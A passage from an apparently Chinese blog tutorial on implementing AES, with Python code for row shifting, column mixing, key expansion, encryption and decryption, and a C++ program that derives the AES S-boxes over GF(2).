class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>] = s[<span class="number">3</span>][<span class="number">1</span>], s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>]</span><br><span class="line">	s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>], s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>] = s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>], s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">	s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>] = s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>], s[<span class="number">0</span>][<span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<h4 id="单列列混淆变换"><a href="#单列列混淆变换" class="headerlink" title="单列列混淆变换"></a>单列列混淆变换</h4><p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102014940.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__mix_single_column</span><span class="params">(self, a)</span>:</span></span><br><span class="line">	t = a[<span class="number">0</span>] ^ a[<span class="number">1</span>] ^ a[<span class="number">2</span>] ^ a[<span class="number">3</span>]</span><br><span class="line">	u = a[<span class="number">0</span>]</span><br><span class="line">	a[<span class="number">0</span>] ^= t ^ xtime(a[<span class="number">0</span>] ^ a[<span class="number">1</span>])</span><br><span class="line">	a[<span class="number">1</span>] ^= t ^ xtime(a[<span class="number">1</span>] ^ a[<span class="number">2</span>])</span><br><span class="line">	a[<span class="number">2</span>] ^= t ^ xtime(a[<span class="number">2</span>] ^ a[<span class="number">3</span>])</span><br><span class="line">	a[<span class="number">3</span>] ^= t ^ xtime(a[<span class="number">3</span>] ^ u)</span><br></pre></td></tr></table></figure>

<h4 id="列混淆变换"><a href="#列混淆变换" class="headerlink" title="列混淆变换"></a>列混淆变换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__mix_columns</span><span class="params">(self, s)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		self.__mix_single_column(s[i])</span><br></pre></td></tr></table></figure>

<h4 id="逆混淆列变换"><a href="#逆混淆列变换" class="headerlink" title="逆混淆列变换"></a>逆混淆列变换</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__inv_mix_columns</span><span class="params">(self, s)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		u = xtime(xtime(s[i][<span class="number">0</span>] ^ s[i][<span class="number">2</span>]))</span><br><span class="line">		v = xtime(xtime(s[i][<span class="number">1</span>] ^ s[i][<span class="number">3</span>]))</span><br><span class="line">		s[i][<span class="number">0</span>] ^= u</span><br><span class="line">		s[i][<span class="number">1</span>] ^= v</span><br><span class="line">		s[i][<span class="number">2</span>] ^= u</span><br><span class="line">		s[i][<span class="number">3</span>] ^= v</span><br><span class="line">	self.__mix_columns(s)</span><br></pre></td></tr></table></figure>

<h4 id="密钥处理"><a href="#密钥处理" class="headerlink" title="密钥处理"></a>密钥处理</h4><h5 id="轮密钥加变换"><a href="#轮密钥加变换" class="headerlink" title="轮密钥加变换"></a>轮密钥加变换</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__add_round_key</span><span class="params">(self, s, k)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			s[i][j] ^= k[i][j]</span><br></pre></td></tr></table></figure>

<h5 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a><strong>密钥扩展</strong></h5><p>将输入的密钥扩展为11组128位密钥组，其中第0组为输入密钥本身 </p>
<p> 其后第n组第i列 为 第n-1组第i列 与 第n组第i-1列之和（模2加法，1&lt;= i &lt;=3）</p>
<p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102042294.png" alt="img"></p>
<p>对于每一组 第一列即i=0，有特殊的处理</p>
<p><img src="https://pic002.cnblogs.com/images/2010/169108/2010103102044067.png" alt="img"></p>
<blockquote>
<p>将前一列即第n-1组第3列的4个字节循环左移1个字节，</p>
<p>并对每个字节进行字节替代变换SubBytes</p>
<p>将第一行（即第一个字节）与轮常量rc[n]相加 </p>
<p>最后再与前一组该列相加 </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, master_key)</span>:</span></span><br><span class="line">	self.change_key(master_key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key</span><span class="params">(self, master_key)</span>:</span></span><br><span class="line">	self.round_keys = text2matrix(master_key)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">4</span> * <span class="number">11</span>):</span><br><span class="line">		self.round_keys.append([])</span><br><span class="line">		<span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">			byte = self.round_keys[i - <span class="number">4</span>][<span class="number">0</span>]        \</span><br><span class="line">				^ Sbox[self.round_keys[i - <span class="number">1</span>][<span class="number">1</span>]]  \</span><br><span class="line">				^ Rcon[int(i/<span class="number">4</span>)]</span><br><span class="line">			self.round_keys[i].append(byte)</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">				byte = self.round_keys[i - <span class="number">4</span>][j]    \</span><br><span class="line">					 ^ Sbox[self.round_keys[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">4</span>]]</span><br><span class="line">				self.round_keys[i].append(byte)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                    byte = self.round_keys[i - <span class="number">4</span>][j]    \</span><br><span class="line">                         ^ self.round_keys[i - <span class="number">1</span>][j]</span><br><span class="line">                    self.round_keys[i].append(byte)</span><br></pre></td></tr></table></figure>

<h4 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">	self.plain_state = text2matrix(plaintext)</span><br><span class="line">	self.__add_round_key(self.plain_state, self.round_keys[:<span class="number">4</span>])</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">	self.__round_encrypt(self.plain_state, self.round_keys[<span class="number">4</span> * i : <span class="number">4</span> * (i + <span class="number">1</span>)])</span><br><span class="line">	self.__sub_bytes(self.plain_state)</span><br><span class="line">	self.__shift_rows(self.plain_state)</span><br><span class="line">	self.__add_round_key(self.plain_state, self.round_keys[<span class="number">40</span>:])</span><br><span class="line">	<span class="keyword">return</span> matrix2text(self.plain_state)</span><br></pre></td></tr></table></figure>

<h4 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, ciphertext)</span>:</span></span><br><span class="line">	self.cipher_state = text2matrix(ciphertext)</span><br><span class="line">	self.__add_round_key(self.cipher_state, self.round_keys[<span class="number">40</span>:])</span><br><span class="line">	self.__inv_shift_rows(self.cipher_state)</span><br><span class="line">	self.__inv_sub_bytes(self.cipher_state)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">		self.__round_decrypt(self.cipher_state, self.round_keys[<span class="number">4</span> * i : <span class="number">4</span> * (i + <span class="number">1</span>)])</span><br><span class="line">        self.__add_round_key(self.cipher_state, self.round_keys[:<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">return</span> matrix2text(self.cipher_state)</span><br></pre></td></tr></table></figure>

<h4 id="AES的S盒"><a href="#AES的S盒" class="headerlink" title="AES的S盒"></a>AES的S盒</h4><p>参考了GitHub和看雪论坛的代码实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"MatrixGF2.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"PolynomialGF2.h"</span></span></span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxPositiveBox(<span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxReverseBox(<span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxBytePositiveTransformMatrix(<span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">MatrixGF2&lt;BYTE&gt; g_mtxByteReverseTransformMatrix(<span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">BYTE g_bytPositiveFixed = <span class="number">0</span>;</span><br><span class="line">BYTE g_bytReverseFixed = <span class="number">0</span>;</span><br><span class="line">PolynomialGF2 g_polyModle; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKEBYTE(_high, _low) (((_high) &lt;&lt; 4) | (_low)) </span></span><br><span class="line"><span class="function">PolynomialGF2 <span class="title">PolynomialEuclidEx</span><span class="params">(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyA,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">const</span> PolynomialGF2 &amp;kref_polyB,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 PolynomialGF2 &amp;ref_polyX,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 PolynomialGF2 &amp;ref_polyY)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (kref_polyB.EqualZero())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"zero!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> iHighestBitIndex = kref_polyA.GetHightestBitIndex();</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyQuotient</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyRemainder</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastLastX</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    polyLastLastX = <span class="number">1</span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastLastY</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    PolynomialGF2 polyLastLastRemainder = kref_polyA;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastX</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function">PolynomialGF2 <span class="title">polyLastY</span><span class="params">(iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    polyLastY = <span class="number">1</span>;</span><br><span class="line">    PolynomialGF2 polyLastRemainder = kref_polyB;</span><br><span class="line">    ref_polyX.Clear();</span><br><span class="line">    ref_polyY.Clear();</span><br><span class="line">    ref_polyX.Insert(<span class="number">0</span>, iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    ref_polyY.Insert(<span class="number">0</span>, iHighestBitIndex + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    ref_polyY = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        polyLastLastRemainder.Division(polyLastRemainder,</span><br><span class="line">                                       polyQuotient,</span><br><span class="line">                                       polyRemainder);</span><br><span class="line">        <span class="keyword">if</span> (polyRemainder.EqualZero())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ref_polyX = polyLastLastX - polyLastX * polyQuotient;</span><br><span class="line">        ref_polyY = polyLastLastY - polyLastY * polyQuotient;</span><br><span class="line">        polyLastLastRemainder = polyLastRemainder;</span><br><span class="line">        polyLastRemainder = polyRemainder;</span><br><span class="line">        polyLastLastX = polyLastX;</span><br><span class="line">        polyLastLastY = polyLastY;</span><br><span class="line">        polyLastX = ref_polyX;</span><br><span class="line">        polyLastY = ref_polyY;</span><br><span class="line">    &#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line">    <span class="keyword">return</span> polyLastRemainder;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitByteTransformMatrix</span><span class="params">(PolynomialGF2 &amp;ref_polyInit,</span></span></span><br><span class="line"><span class="function"><span class="params">                             MatrixGF2&lt;BYTE&gt; &amp;ref_mtxTarget)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> uiColumnNumber = ref_mtxTarget.GetColumnNumber();</span><br><span class="line">    <span class="keyword">if</span> (ref_polyInit.GetSize() != ref_mtxTarget.GetColumnNumber())</span><br><span class="line">    &#123;</span><br><span class="line">        ref_polyInit.PaddingZero(uiColumnNumber);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> uiRowNumber = uiColumnNumber;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntY = <span class="number">0</span>; cntY &lt; uiRowNumber; cntY++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> iOffset = cntY;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> cntX = <span class="number">0</span>; cntX &lt; uiColumnNumber; cntX++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> iActualPos = cntX + iOffset;</span><br><span class="line">            <span class="keyword">if</span> (iActualPos &gt;= uiColumnNumber)</span><br><span class="line">            &#123;</span><br><span class="line">                iActualPos -= uiColumnNumber;</span><br><span class="line">            &#125;</span><br><span class="line">            ref_mtxTarget[cntY][iActualPos] = ref_polyInit[cntX];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitPositiveBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MatrixGF2&lt;BYTE&gt; mtxFixed = PolynomialGF2(g_bytPositiveFixed).GetDequeFormat();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntY = <span class="number">0</span>; cntY &lt; <span class="number">16</span>; cntY++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> cntX = <span class="number">0</span>; cntX &lt; <span class="number">16</span>; cntX++)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE bytSource = (BYTE)MAKEBYTE(cntY, cntX);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == bytSource)</span><br><span class="line">            &#123;</span><br><span class="line">                g_mtxPositiveBox[cntY][cntX] = g_bytPositiveFixed;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            PolynomialGF2 polyInverseElement;</span><br><span class="line">            PolynomialGF2 polyX;</span><br><span class="line">            PolynomialGF2 polySource = bytSource;</span><br><span class="line">            <span class="keyword">if</span> (!polySource.EqualZero())</span><br><span class="line">            &#123;</span><br><span class="line">                PolynomialGF2 polyResult =</span><br><span class="line">                    PolynomialEuclidEx(g_polyModle,</span><br><span class="line">                                       polySource,</span><br><span class="line">                                       polyX,</span><br><span class="line">                                       polyInverseElement);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                polyInverseElement = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            polyInverseElement.ClearInvalidZero();</span><br><span class="line">            MatrixGF2&lt;BYTE&gt; mtxValue = polyInverseElement.GetDequeFormat();</span><br><span class="line"> </span><br><span class="line">            mtxValue.PaddingRow(</span><br><span class="line">                g_mtxBytePositiveTransformMatrix.GetColumnNumber()</span><br><span class="line">            );</span><br><span class="line">            mtxFixed.PaddingRow(mtxValue.GetRowNumber());</span><br><span class="line"> </span><br><span class="line">            mtxValue = g_mtxBytePositiveTransformMatrix * mtxValue + mtxFixed;</span><br><span class="line">            g_mtxPositiveBox[cntY][cntX] =</span><br><span class="line">                (BYTE)PolynomialGF2(mtxValue.Transform2Vector()).ToNumber();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitReverseBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MatrixGF2&lt;BYTE&gt; mtxFixed = PolynomialGF2(g_bytReverseFixed).GetDequeFormat();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntY = <span class="number">0</span>; cntY &lt; <span class="number">16</span>; cntY++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> cntX = <span class="number">0</span>; cntX &lt; <span class="number">16</span>; cntX++)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE bytSource = (BYTE)MAKEBYTE(cntY, cntX);</span><br><span class="line">            MatrixGF2&lt;BYTE&gt; mtxValue = bytSource;</span><br><span class="line">            <span class="keyword">int</span> iValueColumnNumber =</span><br><span class="line">                g_mtxByteReverseTransformMatrix.GetColumnNumber();</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == bytSource)</span><br><span class="line">            &#123;</span><br><span class="line">                mtxValue.InsertRow(<span class="number">0</span>, iValueColumnNumber, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mtxValue.PaddingRow(iValueColumnNumber);</span><br><span class="line">            mtxFixed.PaddingRow(mtxValue.GetRowNumber());</span><br><span class="line">            mtxValue = g_mtxByteReverseTransformMatrix * mtxValue + mtxFixed;</span><br><span class="line">            PolynomialGF2 polyInverseElement;</span><br><span class="line">            PolynomialGF2 polyX;</span><br><span class="line">            PolynomialGF2 polyValue = mtxValue.Transform2Vector();</span><br><span class="line">            <span class="keyword">if</span> (!polyValue.EqualZero())</span><br><span class="line">            &#123;</span><br><span class="line">                PolynomialGF2 polyResult =</span><br><span class="line">                    PolynomialEuclidEx(g_polyModle,</span><br><span class="line">                                       polyValue,</span><br><span class="line">                                       polyX,</span><br><span class="line">                                       polyInverseElement);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                polyInverseElement = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            g_mtxReverseBox[cntY][cntX] = (BYTE)polyInverseElement.ToNumber();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStandardBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_polyModle = &#123; <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    PolynomialGF2 polyPositiveSeed = &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    InitByteTransformMatrix(polyPositiveSeed, g_mtxBytePositiveTransformMatrix);</span><br><span class="line">    PolynomialGF2 polyReverseSeed = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    InitByteTransformMatrix(polyReverseSeed, g_mtxByteReverseTransformMatrix);</span><br><span class="line">    g_bytPositiveFixed = <span class="number">0x63</span>;</span><br><span class="line">    g_bytReverseFixed = <span class="number">0x05</span>;</span><br><span class="line">    InitPositiveBox();</span><br><span class="line">    InitReverseBox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Positive box: \n%s\n"</span>,</span><br><span class="line">           g_mtxPositiveBox.GetWrittenFormat().c_str());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reverse box: \n%s\n"</span>,</span><br><span class="line">           g_mtxReverseBox.GetWrittenFormat().c_str());</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    InitStandardBox();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="重要的实现细节"><a href="#重要的实现细节" class="headerlink" title="重要的实现细节"></a>重要的实现细节</h2><h4 id="GF2域上的计算"><a href="#GF2域上的计算" class="headerlink" title="GF2域上的计算"></a>GF2域上的计算</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 